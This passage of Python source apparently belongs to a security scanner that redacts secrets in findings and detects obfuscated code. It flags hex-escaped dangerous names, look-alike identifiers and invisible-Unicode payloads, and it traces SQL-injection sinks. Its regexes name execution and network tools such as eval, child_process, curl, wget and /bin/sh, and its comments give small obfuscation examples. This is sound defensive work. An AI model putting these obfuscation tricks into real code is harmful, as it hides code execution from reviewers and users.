        if not isinstance(line, str):
            continue
        if inside:
            out.add(k)
            if "-----END" in line and _PEM_END_RE.search(line):
                inside = False
        elif "PRIVATE KEY-----" in line:
            m = _PEM_BEGIN_RE.search(line)
            inside = bool(m) and not _PEM_END_RE.search(line, m.end())
    return out


_SECRET_RUN_RE = re.compile(r"[A-Za-z0-9+/=_\-]{20,}")


class _SecretLiterals:
    """The high-entropy literals S-ENTROPY would flag in one file, redacted
    as substrings wherever they appear (review fix: a literal redacted in its
    own S-ENTROPY finding shipped raw in a neighbouring finding's snippet).
    Candidates are the literals ENTROPY_VALUE_RE finds on any line not
    matching SECRET_SKIP_RE, comment lines included, that pass
    entropy_secretish()."""

    def __init__(self, lines):
        self.lits = set()
        for line in lines:
            if not isinstance(line, str) or ("=" not in line and ":" not in line):
                continue
            if SECRET_SKIP_RE.search(line):
                continue
            for m in ENTROPY_VALUE_RE.finditer(line):
                if entropy_secretish(m.group(1)):
                    self.lits.add(m.group(1))
        self.by_prefix = {}
        for lit in self.lits:
            self.by_prefix.setdefault(lit[:20], []).append(lit)

    def redact(self, text):
        if not self.lits or not isinstance(text, str):
            return text
        hits = []
        for m in _SECRET_RUN_RE.finditer(text):
            run, base = m.group(), m.start()
            if run in self.lits:
                hits.append((base, m.end()))
                continue
            for p in range(len(run) - 19):
                for lit in self.by_prefix.get(run[p:p + 20], ()):
                    if run.startswith(lit, p):
                        hits.append((base + p, base + p + len(lit)))
        if not hits:
            return text
        hits.sort()
        parts, pos = [], 0
        for a, b in hits:
            if b <= pos:
                continue
            parts.append(text[pos:max(a, pos)])
            parts.append(REDACTED)
            pos = b
        parts.append(text[pos:])
        return "".join(parts)


def _redact_lines(lines, secrets=None):
    """Redacted copies of a list of lines: PEM blocks whole, then the
    pattern list and the file's entropy literals."""
    pem = _pem_block_lines(lines)
    out = []
    for k, l in enumerate(lines):
        if not isinstance(l, str):
            out.append(l)
        elif k in pem:
            out.append(REDACTED)
        else:
            l = _redact_context_line(l)
            out.append(secrets.redact(l) if secrets is not None else l)
    return out


def _redact_text(text, secrets=None):
    """Redaction for free text that may copy source (issue msg, hook cmd)."""
    if not isinstance(text, str):
        return text
    if "\n" in text:
        return "\n".join(_redact_lines(text.split("\n"), secrets))
    text = _redact_context_line(text)
    return secrets.redact(text) if secrets is not None else text


def redact_secret_snippet(rid, snippet, flagged_idx, raw_line):
    """Redact a secret-bearing snippet copy.

    Two things happen, on a COPY (the caller's `snippet` is never mutated):

    1. The FLAGGED line is replaced by the REDACT_PLACEHOLDER plus its
       length, so two scans of the same line redact to the same text and
       baselines still match (fingerprint() hashes the flagged line; the
       placeholder is deterministic for a stable rule + secret length).
    2. Every OTHER line in the context window is scanned with the
       line-level secret matchers: a snippet around a flagged S-SECRET
       commonly contains a SECOND credential the flagged rule didn't match
       (my probe: S-SECRET at line 3, AKIA… at line 4 in the same snippet).
       Only the matched substring is replaced; surrounding code stays
       readable. Lines of a PEM key block that starts in the snippet are
       redacted whole.
    """
    out = _redact_lines(snippet)
    if 0 <= flagged_idx < len(out):
        out[flagged_idx] = (REDACT_PLACEHOLDER.replace("{RULE}", rid)
                            + f" ({len(raw_line)} chars)")
    return out


# ---------------- Hex-escape decoding (SC-HEXSTR) ----------------
# Obfuscation means escaping characters that did not need it: "\x65\x76\x61\x6c"
# spells "eval". Binary data (NUL bytes, byte-order marks, UTF-8 sequences,
# protocol bytes) legitimately *needs* escapes and is never flagged.
_HEX_ESCAPE_RE = re.compile(r"\\x([0-9A-Fa-f]{2})")
HEX_MIN_ESCAPES = 8
HEX_PRINTABLE_SHARE = 0.75
HEX_LETTER_SHARE = 0.4          # of the decoded text: readable means words
_LETTER_RUN_RE = re.compile(r"[A-Za-z]{3}")
HIDDEN_TEXT_DANGER_RE = re.compile(
    r"https?://|\b(?:eval|exec|execSync|compile|__import__|import|require|child_process|"
    r"subprocess|system|popen|spawn|powershell|cmd\.exe|curl|wget|base64|b64decode|atob|"
    r"Function|fromCharCode|marshal|pickle)\b|/bin/(?:ba)?sh", re.I)


def hex_hidden_text(line):
    r"""The readable text hidden in a line's \xNN escapes, or None when the
    escapes encode binary data (or there are too few to matter)."""
    codes = [int(h, 16) for h in _HEX_ESCAPE_RE.findall(line)]
    if len(codes) < HEX_MIN_ESCAPES:
        return None
    printable = [c for c in codes if 0x20 <= c < 0x7F]
    if len(printable) / len(codes) < HEX_PRINTABLE_SHARE:
        return None
    text = "".join(map(chr, printable))
    # Readable means words: palette bytes and punctuation tables that happen to
    # fall in the printable range ("-95479:37", "!$*-:=?[]") are data.
    letters = sum(ch.isalpha() for ch in text)
    if not _LETTER_RUN_RE.search(text) or letters / len(text) < HEX_LETTER_SHARE:
        return None
    return text


# Fewer escapes than HEX_MIN_ESCAPES still hide a name when the name is the
# point (analyst gap): global["\x72\x65\x71\x75\x69\x72\x65"]("child_process")
# spells require in 7 escapes, "\x65val" eval in one. Nothing needs to escape
# a letter, digit or "_" of such a name, so a string literal in which a
# dangerous name (HIDDEN_TEXT_DANGER_RE) has one of those written as an
# escape — \xNN, \uNNNN, \u{N…}, \UNNNNNNNN or a three-digit octal escape of a
# printable ASCII character — is SC-HEXSTR, CRITICAL, whatever the count.
# Punctuation escapes do not count (serializers write "/" as \u002F:
# "https:\u002F\u002F…" hides no URL), a literal whose escapes are mostly
# binary data is data (b"\x00\x04\x65xec" is a packet), and an escape after
# an odd run of backslashes is an escaped backslash and text.
_NAME_ESCAPE_RE = re.compile(
    r"\\(?:x([0-9A-Fa-f]{2})|u([0-9A-Fa-f]{4})|u\{([0-9A-Fa-f]{1,6})\}|U([0-9A-Fa-f]{8})|([0-7]{3}))")


def hex_hidden_name(line):
    r"""(name, column) for the first string literal on this line whose
    escape sequences spell part of a dangerous name ("\x65val",
    global["\x72\x65\x71…"]), else None: the name as decoded, and the
    column of its first escaped letter, digit or "_"."""
    if "\\" not in line:
        return None
    for lit in STRING_LIT_RE.finditer(line):
        if "\\" in lit.group():
            found = _hidden_name_in(lit.group()[1:-1], lit.start() + 1)
            if found is not None:
                return found
    return None


def _hidden_name_in(seg, offset):
    pieces, esc_at, esc_col = [], [], []
    pos = size = total = printable = 0
    for m in _NAME_ESCAPE_RE.finditer(seg):
        start = run = m.start()
        while run > 0 and seg[run - 1] == "\\":
            run -= 1
        if (start - run) % 2:
            continue                        # "\\x65": an escaped backslash, then text
        total += 1
        digits = m.group(1) or m.group(2) or m.group(3) or m.group(4)
        code = int(digits, 16) if digits is not None else int(m.group(5), 8)
        if code > 0x10FFFF:
            continue                        # no character: left as written
        ch = chr(code)
        pieces.append(seg[pos:start])
        size += start - pos
        if 0x20 <= code < 0x7F:
            printable += 1
            if ch.isalnum() or ch == "_":
                esc_at.append(size)
                esc_col.append(offset + start)
        pieces.append(ch)                   # every escape decoded: b"\x00\x65val" holds the word eval
        size += 1
        pos = m.end()
    if not esc_at or printable / total < HEX_PRINTABLE_SHARE:
        return None
    pieces.append(seg[pos:])
    text = "".join(pieces)
    for m in HIDDEN_TEXT_DANGER_RE.finditer(text):
        k = bisect.bisect_left(esc_at, m.start())
        if k < len(esc_at) and esc_at[k] < m.end():
            return m.group(), esc_col[k]
    return None


# ---------------- Look-alike identifiers (SC-HOMOGLYPH) ----------------
# A name spelled with letters from another alphabet that look like Latin ones
# reads as a name it is not (the homoglyph half of Trojan Source,
# CVE-2021-42694): `const \u0435val = eval; \u0435val(x)`, with a Cyrillic e
# (U+0435), calls eval where no reviewer sees eval called, and isAdm\u0456n
# (a Cyrillic i) is not isAdmin. _LOOKALIKES maps the letters drawn like a
# Latin letter in common fonts: Cyrillic, Greek capitals, omicron and lunate
# sigma, Armenian o and u, Latin alpha and script g. Not every confusable:
# Greek alpha, nu and rho, the variables of scientific code, are left out.
# JavaScript also takes NFKC's compatibility forms as names of their own
# (fullwidth \uff45val is not eval there; Python reads it as eval) and allows
# the invisible U+200C / U+200D inside a name. A name whose skeleton
# (look-alikes mapped, invisibles dropped) is an ASCII name it is not is
# SC-HOMOGLYPH: CRITICAL when it reads as a code-execution or network name
# (_LOOKALIKE_TARGETS) or as another name in the file (three characters or
# more), MAJOR when it mixes ASCII letters with look-alikes. Anything else —
# a Cyrillic word — is left alone. Names are read where the lexer reads code
# (_FileCtx.names_code): not in comments, strings (a template or f-string
# whole, fields too) or regex literals, whose escapes are not names either:
# ajv's /http[s\u017F]?/ holds no name "s\u017f", nor a class like
# [a-zA-Z\u0430-\u044f] a name "Z\u0430". (This file writes every
# such character as an escape.)
_LOOKALIKES = dict(zip(
    "\u0430\u0435\u043e\u0440\u0441\u0443\u0445\u0455\u0456\u0458\u04bb\u0501\u051b\u051d\u04cf"   # Cyrillic
    "\u0410\u0412\u0415\u041a\u041c\u041d\u041e\u0420\u0421\u0422\u0425\u0405\u0406\u0408\u04ae\u051a\u051c\u04c0"
    "\u0391\u0392\u0395\u0396\u0397\u0399\u039a\u039c\u039d\u039f\u03a1\u03a4\u03a5\u03a7\u03dc"   # Greek
    "\u03bf\u03f2\u03f3"
    "\u0585\u057d"                                                                                  # Armenian
    "\u0251\u0261",                                                                                 # Latin (IPA)
    "aeopcyxsijhdqwl" "ABEKMHOPCTXSIJYQWI" "ABEZHIKMNOPTYXF" "ocj" "ou" "ag"))
_LOOKALIKE_TARGETS = frozenset((
    "eval", "exec", "execSync", "execFile", "execFileSync", "spawn", "spawnSync", "fork", "Function",
    "require", "import", "__import__", "import_module", "compile", "system", "popen", "Popen",
    "check_output", "check_call", "getoutput", "child_process", "subprocess", "os", "vm",
    "runInThisContext", "runInNewContext", "runInContext", "atob", "b64decode", "fromCharCode",
    "globalThis", "window", "global", "process", "Buffer", "setTimeout", "setInterval", "getattr",
    "builtins", "__builtins__", "marshal", "pickle", "fetch", "urlopen", "socket"))
_NAME_RUN_RE = re.compile(r"[\w$\u200c\u200d]+")
_ASCII_WORD_RE = re.compile(r"[A-Za-z0-9_$]+")
_ASCII_LETTER_RE = re.compile(r"[A-Za-z]")
_INVISIBLE_IN_NAMES = frozenset("\u200c\u200d")


def lookalike_name(code, lang, words):
    """(name, reads_as, severity, other, detail, column) for the first name
    in `code` (a line as _FileCtx.names_code reads it: comments removed,
    literals blanked) that reads as an ASCII name it is not (see above),
    else None. `words()` gives the file's ASCII words; it is called only
    when a look-alike name is found."""
    if code.isascii():
        return None
    for m in _NAME_RUN_RE.finditer(code):
        name = m.group()
        if name.isascii() or (m.start() and code[m.start() - 1] == "\\"):
            continue                        # after an escape left as written (\uFF07 is no name)
        seen = unicodedata.normalize("NFKC", name) if lang == "js" else name
        skeleton = "".join(_LOOKALIKES.get(ch, ch) for ch in seen if ch not in _INVISIBLE_IN_NAMES)
        if not skeleton or skeleton == name or not skeleton.isascii() or skeleton[0].isdigit():
            continue
        if skeleton in _LOOKALIKE_TARGETS:
            severity, other = "CRITICAL", False
        elif len(skeleton) >= 3 and skeleton in words():
            severity, other = "CRITICAL", True
        elif _ASCII_LETTER_RE.search(name):
            severity, other = "MAJOR", False
        else:
            continue
        parts = []
        for ch in name:
            if ch.isascii():
                continue
            if ch in _INVISIBLE_IN_NAMES:
                part = _LOOKALIKE_INVISIBLE.format(cp=f"U+{ord(ch):04X}")
            else:
                shown = unicodedata.normalize("NFKC", ch) if lang == "js" else ch
                part = _LOOKALIKE_LETTER.format(cp=f"U+{ord(ch):04X}",
                                                reads=''.join(_LOOKALIKES.get(c, c) for c in shown))
            if part not in parts:
                parts.append(part)
        return name, skeleton, severity, other, ", ".join(parts), m.start()
    return None


_LOOKALIKE_WHY = (
    "A name written with letters from another alphabet that look like Latin ones, or with an "
    "invisible character inside it, is not the name a reviewer reads: `const eval = eval` with "
    "a Cyrillic e (U+0435) makes a second eval that runs where no one sees eval called, and an "
    "isAdmin with a Cyrillic i is not isAdmin (CVE-2021-42694, the homoglyph half of Trojan "
    "Source).")


_LOOKALIKE_RULE = {
    "id": "SC-HOMOGLYPH", "name": "Look-alike identifier", "type": "HOTSPOT", "sev": "CRITICAL",
    "msg": "{name!r} reads as {skeleton!r}{where} but is spelled with {detail}.",
    "why": _LOOKALIKE_WHY,
    "fix": "Rename it with the letters it appears to have, and find out why it was written this way.",
    "ref": "CWE-1007 · CVE-2021-42694"}
_LOOKALIKE_OTHER = ", another name in this file,"     # {where}, when it reads as another name of the file
_LOOKALIKE_INVISIBLE = "an invisible {cp}"            # the parts of {detail}, joined with ", "
_LOOKALIKE_LETTER = "{cp} for {reads!r}"


def lookalike_issue(found, path, line_no, lines):
    name, skeleton, severity, other, detail, col = found
    where = _LOOKALIKE_OTHER if other else ""
    return mk_issue(
        dict(_LOOKALIKE_RULE, sev=severity,
             msg=_LOOKALIKE_RULE["msg"].format(name=name, skeleton=skeleton, where=where, detail=detail)),
        path, line_no, lines, col)


# ---------------- Invisible-character payload (SC-HIDDEN-UNICODE) ----------------
# A run of invisible characters carries bytes no reviewer or diff can see:
# variation selectors (U+FE00-FE0F, U+E0100-E01EF) or tag characters
# (U+E0000-E007F). GlassWorm (Oct 2025, 150+ repos across npm and VS Code) hid
# its payload in variation selectors and decoded it with a codePointAt map into
# eval; tag characters smuggle instructions past a reviewer and an AI reading
# the file. The only ordinary runs are a flag emoji (a U+1F3F4 base, tag
# letters, the U+E007F terminator), left alone, and a lone emoji variation
# selector (U+FE0F), one character and below the run threshold. A run in a file
# that runs code from a string (eval, Function, exec) is CRITICAL (the GlassWorm
# shape), else MAJOR.
_HIDDEN_RUN_RE = re.compile("[\U0000FE00-\U0000FE0F\U000E0000-\U000E01EF]{2,}")
_FLAG_EMOJI_BASE = "\U0001F3F4"
_TAG_START = "\U000E0000"
_TAG_END = "\U000E007F"
_HIDDEN_EXEC_RE = re.compile(
    r"(?<![\w$.])(?:eval|Function|execSync|exec|runInThisContext|runInNewContext|runInContext)\s*\(")


def _hidden_flag_emoji(line, m):
    """The run m is a flag emoji's tag sequence (a U+1F3F4 base, tag letters,
    the U+E007F terminator): an ordinary run, left alone."""
    run = m.group()
    return (m.start() > 0 and line[m.start() - 1] == _FLAG_EMOJI_BASE
            and run.endswith(_TAG_END) and all(_TAG_START <= c <= _TAG_END for c in run))


def hidden_unicode_run(line):
    """(col, run) for the first run of invisible carrier characters in `line`
    that is not a flag emoji, else None."""
    for m in _HIDDEN_RUN_RE.finditer(line):
        if not _hidden_flag_emoji(line, m):
            return m.start(), m.group()
    return None


_HIDDEN_UNICODE_WHY = (
    "Invisible characters in source carry bytes that no review or diff shows: a variation selector or a "
    "tag character has no business in code. GlassWorm hid a payload in variation selectors and decoded it "
    "into eval; tag characters smuggle instructions past a reviewer and an AI reading the file. Only a flag "
    "emoji and a single emoji variation selector are ordinary.")


_HIDDEN_UNICODE_RULE = {
    "id": "SC-HIDDEN-UNICODE", "name": "Invisible-character payload", "type": "HOTSPOT", "sev": "MAJOR",
    "msg": "A run of {n} invisible {what} carries hidden data in the code.",
    "why": _HIDDEN_UNICODE_WHY,
    "fix": "Show the characters as escape sequences and decode what they spell; if it is a payload, do not run the file.",
    "ref": "CWE-506 · Supply chain"}
# ... CRITICAL, with this message, in a file that runs code from a string
_HIDDEN_UNICODE_RUNS_MSG = "A run of {n} invisible {what} carries hidden data in the code, and the file runs code from a string."
_HIDDEN_UNICODE_WHAT = {"both": "variation selectors and tag characters", "tags": "tag characters",
                        "selectors": "variation selectors"}


def _hidden_unicode_issue(path, line_no, lines, col, run, runs_code):
    tags = any(_TAG_START <= c <= _TAG_END for c in run)
    varsel = any(not (_TAG_START <= c <= _TAG_END) for c in run)
    what = _HIDDEN_UNICODE_WHAT["both" if tags and varsel else "tags" if tags else "selectors"]
    msg = _HIDDEN_UNICODE_RUNS_MSG if runs_code else _HIDDEN_UNICODE_RULE["msg"]
    return mk_issue(dict(_HIDDEN_UNICODE_RULE, sev="CRITICAL" if runs_code else "MAJOR",
                         msg=msg.format(n=len(run), what=what)), path, line_no, lines, col)


_PEM_BODY_RE = re.compile(r"[A-Za-z0-9+/]{40,}={0,2}")


def _token_has_material(rule_re, line, lines, i):
    """A "-----BEGIN ... PRIVATE KEY-----" header alone is not a key: libraries
    keep the header as a constant to recognize key files. Require base64 key
    material after it, on the same line or the next two."""
    match = rule_re.search(line)
    if not match or not match.group(0).startswith("-----BEGIN"):
        return True
    following = [line[match.end():]] + lines[i + 1:i + 3]
    return any(_PEM_BODY_RE.search(text) for text in following)


# ---------------- Snippets (review fix: shared semantics 7) ----------------
# A finding used to copy its ±2 context lines whole: a 22.5 KB one-line file
# produced a 34 MB JSON and a 34 MB HTML report. Every snippet line is now
# clipped to SNIPPET_MAX characters. The flagged line is windowed around the
# match: the window starts SNIPPET_LEAD characters before the match column
# (never past the point where it would run off the end), and "…" marks each
# side that was cut. Other lines keep their start.
SNIPPET_MAX = 240
SNIPPET_LEAD = 60
ELLIPSIS = "\u2026"


def clip_snippet_line(text, col=None):
    """`text` clipped to at most SNIPPET_MAX characters (see above)."""
    if not isinstance(text, str) or len(text) <= SNIPPET_MAX:
        return text
    start = 0 if col is None else max(0, col - SNIPPET_LEAD)
    start = min(start, len(text) - (SNIPPET_MAX - 1))
    head = ELLIPSIS if start > 0 else ""
    end = start + SNIPPET_MAX - len(head)
    if end < len(text):
        return head + text[start:end - 1] + ELLIPSIS
    return head + text[start:]


def mk_issue(rule_or_dict, path, line_no, lines, col=None, redactor=None):
    """Issue dict for rule `rule_or_dict` at 1-based `line_no` of `lines`.
    `col` (0-based character offset of the match on the flagged line, if
    known) centres the flagged line's snippet window on the match.
    `redactor` (a _Redactor, or scan_gyp's _LineRedactor, over these same
    `lines`) supplies the file's entropy literals and PEM blocks and caches
    each redacted line for a producer of many findings in one file; by
    default the active scan_file context does, when it is scanning `lines`."""
    r = rule_or_dict
    start = max(0, line_no - 3)
    stop = min(len(lines), line_no + 2)
    flag = line_no - 1
    snippet = []
    # L1 (artifact hygiene): the flagged line of a SECRET-rule finding is
    # redacted at creation time, so EVERY sink — terminal excerpt, JSON/HTML
    # report, SARIF region, the registry Store blob — persists the
    # placeholder, never the credential. Previously only issue_excerpt()
    # (terminal) honored REDACT_SECRETS while reports shipped the raw line.
    # Additionally, ANY rule's ±2-line context window is swept for
    # secret-shaped substrings (a snippet around an os.system finding
    # routinely contains the file's actual credentials on adjacent lines).
    # Redaction runs on the whole line, before clipping, so a clip boundary
    # can never cut a secret into a no-longer-matching fragment.
    # The message is redacted too: some embed source text (an install hook's
    # command line, a hex-decoded preview) — review: a PAT in a `prepare`
    # script reached the terminal, JSON, HTML and SARIF through msg.
    msg = r["msg"]
    if redactor is None or redactor.lines is not lines:
        redactor = _active_ctx(lines)
    ctx = redactor if REDACT_SECRETS else None
    if REDACT_SECRETS:
        msg = _redact_text(msg, ctx.secrets() if ctx is not None else None)
    redact = REDACT_SECRETS and 0 <= flag < len(lines)
    pem = _pem_block_lines(lines) if redact and ctx is None else ()
    for k in range(start, stop):
        l = lines[k]
        if not isinstance(l, str):
            snippet.append(l)
            continue
        if redact:
            if k == flag and r["id"] in SECRET_RULES:
                l = REDACT_PLACEHOLDER.replace("{RULE}", r["id"]) + f" ({len(l)} chars)"
            elif ctx is not None:
                l = ctx.redacted(k)
            else:
                l = REDACTED if k in pem else _redact_context_line(l)
        snippet.append(clip_snippet_line(l, col if k == flag else None))
    return {"rule": r["id"], "name": r["name"], "type": r["type"], "sev": r["sev"],
            "msg": msg, "why": r["why"], "fix": r["fix"], "ref": r["ref"],
            "file": path, "line": line_no,
            "snippet": snippet,
            "snipStart": start + 1}


# ---------------- Per-file finding cap (review fix: shared semantics 7) ----------------
# Findings identical on (rule, file, line, msg) are reported ONCE (the first,
# i.e. leftmost, one is kept): they are indistinguishable in every report —
# same line, same snippet text. Then at most CAP_PER_RULE findings per (file,
# rule) are kept, in line order, for every rule that is not a security rule;
# the rest are replaced by ONE Q-CAPPED INFO finding per capped rule at the
# first omitted line, which carries how many it replaces ("omitted") and
# their type ("omittedType"; the maintainability rating counts them). Security
# findings (S-, T-, SC-, X-, SQL- rules) are never capped (but are
# deduplicated: distinct taint flows on one line keep their distinct
# messages). Review: the cap used to cover INFO/MINOR/SMELL
# rules only, so a 1.95 MB one-line `try{}catch(e){}` x 130k file gave 130,001
# MAJOR B-EMPTY-CATCH findings and an 87.7 MB JSON report (120k lines: 66.7 MB).
CAP_PER_RULE = 200
_NEVER_CAPPED_PREFIXES = ("S-", "T-", "SC-", "X-", "SQL-")
_CAPPED_RULE = {
    "id": "Q-CAPPED", "name": "Findings capped", "type": "SMELL", "sev": "INFO",
    "msg": "{n} more {rule} findings omitted",
    "why": ("Findings of one rule that repeat hundreds of times in one file are capped "
            "so reports stay readable; security findings are never capped."),
    "fix": ("Fix or deliberately suppress the {rule} pattern in this file, then re-scan "
            "to see the remaining occurrences."),
    "ref": "Maintainability"}


def _cappable(issue):
    return not str(issue.get("rule", "")).startswith(_NEVER_CAPPED_PREFIXES)


def dedupe_issues(issues):
    """`issues` without repeats of the same (rule, file, line, msg); the first
    of each is kept, order is preserved."""
    seen, out = set(), []
    for i in issues:
        key = (i.get("rule"), i.get("file"), i.get("line"), i.get("msg"))
        if key in seen:
            continue
        seen.add(key)
        out.append(i)
    return out


def cap_issues(path, issues, lines):
    """`issues` (one file's findings) deduplicated, then with the per-rule cap
    applied (see above)."""
    issues = dedupe_issues(issues)
    counts, dropped, omitted = {}, set(), {}
    order = sorted(range(len(issues)), key=lambda k: issues[k].get("line", 0))
    for k in order:
        i = issues[k]
        if not _cappable(i):
            continue
        rid = i["rule"]
        counts[rid] = counts.get(rid, 0) + 1
        if counts[rid] > CAP_PER_RULE:
            dropped.add(k)
            o = omitted.setdefault(rid, [0, i["line"], i["type"]])
            o[0] += 1
    if not dropped:
        return issues
    out = [i for k, i in enumerate(issues) if k not in dropped]
    for rid, (n, first, typ) in omitted.items():
        note = mk_issue(dict(_CAPPED_RULE, msg=_CAPPED_RULE["msg"].format(n=n, rule=rid),
                             fix=_CAPPED_RULE["fix"].format(rule=rid)), path, first, lines)
        # what the note stands for: the maintainability rating counts the
        # omitted findings, not the note (see maintainability_rating)
        note["omitted"] = n
        note["omittedType"] = typ
        out.append(note)
    return out


def extract_functions(lines, lang):
    fns = []
    if lang not in ("py", "js"):   # function/complexity metrics don't apply to SQL
        return fns
    if lang == "py":
        # A def ends at the first later line that is non-blank, not a
        # comment, and indented no deeper than the def. Review fix: that was
        # a forward scan per def — O(defs × lines) (300 nested defs over
        # 30 000 blank lines: 0.85 s, quadratic). One pass with a stack of
        # open defs gives the same spans; complexity is summed per line.
        cx_re = re.compile(r"\b(if|elif|for|while|and|or|except|case)\b")
        def_re = re.compile(r"^(\s*)(?:async\s+)?def\s+(\w+)")
        cx_prefix = [0]
        for line in lines:
            cx_prefix.append(cx_prefix[-1] + len(cx_re.findall(line)))
        found = []                        # (line_i, name) in source order
        spans = {}                        # line_i -> end (exclusive)
        stack = []                        # (indent, line_i), indents increasing
        for k, l in enumerate(lines):
            m = def_re.match(l)
            t = l.strip()
            if t and not t.startswith("#"):
                ind = len(m.group(1)) if m else len(l) - len(l.lstrip())
                while stack and stack[-1][0] >= ind:
                    spans[stack.pop()[1]] = k
            if m:
                found.append((k, m.group(2)))
                stack.append((len(m.group(1)), k))
        for _ind, k in stack:
            spans[k] = len(lines)
        for i, name in found:
            end = spans[i]
            fns.append({"name": name, "line": i + 1, "len": end - i,
                        "cx": 1 + cx_prefix[end] - cx_prefix[i]})
    else:
        # G4 fix: the old implementation restarted a forward 800-line window
        # scan for EVERY fn_re match — on minified/adversarial JS that is
        # O(lines × 800 × line_length) (20 s CPU for a 1.5 MB file, audit G4)
        # plus a body-string copy per function (memory blowup). This version
        # walks the brace structure ONCE with a stack. Old semantics are
        # preserved deliberately: each header's scan started at the first
        # character of its LINE, so a header claims the first '{' at/after its
        # line start (including its own, for `name(…){`-style matches), and
        # two headers on nested lines share a '{' exactly as their independent
        # scans both counted it. Function span = claimed '{' .. balancing '}'.
        content = "\n".join(lines)
        starts = [0]                      # line -> start offset (sorted)
        find = content.find
        pos = find("\n")
        while pos != -1:
            starts.append(pos + 1)
            pos = find("\n", pos + 1)
        starts.append(len(content) + 1)   # sentinel
        cx_re = re.compile(r"\b(if|for|while|case|catch)\b|&&|\|\||\?[^.:]")
        # Review fix: `(\w+)\s*\([^)]*\)\s*\{` restarted inside every \w run
        # and every unclosed '(' scan ran to the end of the line — O(n²): a
        # benign 32 KB hex literal took 12.7 s. The name must now start a
        # word run (?<!\w), parameter lists stop at the next '(' ([^()]*), and
        # only the first FN_HEADER_SCAN_LIMIT characters of a line are
        # searched for its (first) header.
        fn_re = re.compile(
            r"(?:function\s+(\w+)|(?:const|let|var)\s+(\w+)\s*=\s*(?:async\s*)?"
            r"(?:function|\([^()]*\)\s*=>|\w+\s*=>)|(?<!\w)(\w+)\s*\([^()]*\)\s*\{)")
        # headers: first match per line (old semantics)
        headers = []                      # (line_i, name)
        for i, line in enumerate(lines):
            m = fn_re.search(line, 0, FN_HEADER_SCAN_LIMIT)
            if m:
                name = m.group(1) or m.group(2) or m.group(3) or "(anonymous)"
                headers.append((i, name))
        # per-line complexity counts — tokens cannot span '\n' except the
        # two-char '?x' (which '\n' satisfies); per-line counting is the
        # linear-time equivalent of the old body-copy findall.
        cx_prefix = [0]
        for line in lines:
            cx_prefix.append(cx_prefix[-1] + len(cx_re.findall(line)))
        # brace positions (one regex pass, no per-char Python loop)
        opens = [m.start() for m in re.finditer(r"\{", content)]
        # one brace walk: stack of (open_pos, owner header indices).
        from bisect import bisect_left, bisect_right
        matched = {}                      # header idx -> (open_pos, close_pos)
        stack, waiting, hi = [], [], 0
        for bm in re.finditer(r"[{}]", content):
            bpos = bm.start()
            while hi < len(headers) and starts[headers[hi][0]] <= bpos:
                waiting.append(hi)        # header's line has begun: it claims
                hi += 1                   # the next '{' it sees (old semantics)
            if bm.group() == "{":
                stack.append((bpos, waiting))
                waiting = []
            elif stack:
                open_pos, owners = stack.pop()
                for h in owners:
                    matched[h] = (open_pos, bpos)
        for h, (i, name) in enumerate(headers):
            nlines = len(lines)
            window_end_off = starts[min(nlines, i + 800)]   # old 800-line cap
            k = bisect_left(opens, starts[i])
            if k == len(opens) or opens[k] >= window_end_off:
                continue          # no '{' in window: old `started` never set
            if h in matched and matched[h][1] < window_end_off:
                close_pos = matched[h][1]
                end = bisect_right(starts, close_pos) - 1  # line of closing '}'
            else:
                # opened but never closed within the window: the old scan
                # ran to the window end and reported that truncated span.
                end = min(nlines, i + 800) - 1
            fns.append({"name": name, "line": i + 1, "len": end - i + 1,
                        "cx": 1 + cx_prefix[end + 1] - cx_prefix[i]})
    return fns

DEP_RULE_PREFIXES = ("SC-", "S-TOKEN", "S-SECRET")

# ---------------- SQL sink analysis (G12) ----------------
# The line-rule S-SQL-PY only sees formatting applied to a literal *inside*
# the execute() call. Three common idioms escape a single-line regex, so
# scan_file() runs this analyzer on every execute()/executemany() line:
#   1. cur.execute(sql % user_input)  — %-interpolation with no space after %
#      (the old pattern required one), or "…" + x concatenation, in the call
#   2. cur.execute(SQL.format(x))     — .format()/f-string on a variable
#   3. cur.execute(sql)               — where `sql` was assigned a %-or-{}
#      template or built by interpolation/concatenation earlier in the file
# Calls with a parameter tuple — execute(q, (x,)) / execute("…%s", (x,)) —
# are the SAFE idiom and are never flagged here.
SQL_CALL_RE = re.compile(r"\.(execute|executemany)\s*\(")
SQL_IDENT_RE = re.compile(r"[A-Za-z_]\w*")
# `(.+)$` + rstrip() in the caller: the old lazy `(.+?)\s*$` retried `\s*$`
# at every character of a long whitespace run (quadratic).
SQL_ASSIGN_RE = re.compile(r"^\s*([A-Za-z_]\w*)\s*(\+=|=)(?!=)\s*(.+)$")
SQL_LIT_RE = re.compile(r"^(?:[rbu]*)[\"'](.*)[\"']$", re.S)

def _split_top_level(argstr):
    """Split an argument string on top-level commas (respecting nested
    brackets and quotes) to isolate the SQL text argument from the parameter
    tuple that follows it."""
    parts, depth, cur, quote = [], 0, [], None
    for ch in argstr:
        if quote:
            cur.append(ch)
            if ch == quote:
                quote = None
            continue
        if ch in "\"'":
            quote = ch
            cur.append(ch)
        elif ch in "([{":
            depth += 1
            cur.append(ch)
        elif ch in ")]}":
            depth -= 1
            cur.append(ch)
        elif ch == "," and depth == 0:
            parts.append("".join(cur))
            cur = []
        else:
            cur.append(ch)
    parts.append("".join(cur))
    return parts

def _sql_build_method(arg):
    """How an execute() argument (or an assigned expression) builds a string:
    'format' (.format(…)/f-string), 'percent' (x % y), 'concat' ("…" + x),
    or None when the argument is a plain literal/identifier."""
    if re.search(r"\.format\s*\(", arg) or arg.lstrip().startswith(("f\"", "f'")):
        return "format"
    # a `%` binary op with a string/identifier left side (not numeric modulo)
    if re.search(r"(?:[\"'][^\"']*[\"']|\b[A-Za-z_]\w*)\s*%\s*[^=%\s]", arg):
        return "percent"
    # concatenation with a literal on one side
    if re.search(r"[\"'][^\"']*[\"']\s*\+", arg) or re.search(r"\+\s*[\"']", arg):
        return "concat"
    return None

def _sql_template_map(lines):
    """varname → how its value is built, from earlier simple assignments:
    literal templates ('percent' when they contain %, 'format' when they
    contain {}), or %-/.format/concat expressions."""
    tmap = {}
    for ln in lines:
        mm = SQL_ASSIGN_RE.match(ln)
        if not mm:
            continue
        var, op, rhs = mm.group(1), mm.group(2), mm.group(3).rstrip()
        if op == "+=":
            tmap[var] = tmap.get(var, "concat")
            continue
        build = _sql_build_method(rhs)
        if build:
            tmap[var] = build
            continue
        lit = SQL_LIT_RE.match(rhs.strip())
        if lit:
            t = lit.group(1)
            tmap[var] = "percent" if "%" in t else "format" if "{" in t else "static"
    return tmap

#: Review fix (quadratic hot spot): per line, at most this many execute()
#: calls are analyzed and each argument string is cut to SQL_ARG_MAX chars.
